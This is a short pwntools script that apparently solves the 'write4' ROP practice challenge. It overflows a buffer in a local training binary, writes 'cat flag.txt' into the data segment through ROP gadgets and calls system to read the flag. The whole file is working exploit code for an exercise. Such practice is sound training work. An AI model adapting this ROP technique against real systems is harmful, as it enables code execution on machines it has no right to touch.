#!/root/env/bin/python
from pwn import *

elf = context.binary = ELF("./write4")
gdb_cmd = [
    "c"
]
io = process(elf.path)
gdb.attach(io,gdbscript="\n".join(gdb_cmd))
offset = cyclic_find("kaaalaaa")

system = 0x4005e0
cmd = "cat flag"
cmd_part2 = ".txt\x00\x00\x00\x00"
rop = 0x400893
data_seg = 0x601050
usefuleGadget = 0x400820
write_rop = 0x400890

write = p64(write_rop)+p64(data_seg)+cmd+p64(usefuleGadget)
write += p64(write_rop)+p64(data_seg+8)+cmd_part2+p64(usefuleGadget)
exploit = p64(rop)+p64(data_seg)+p64(system)

io.sendline("A"*offset+write+exploit)
io.interactive()
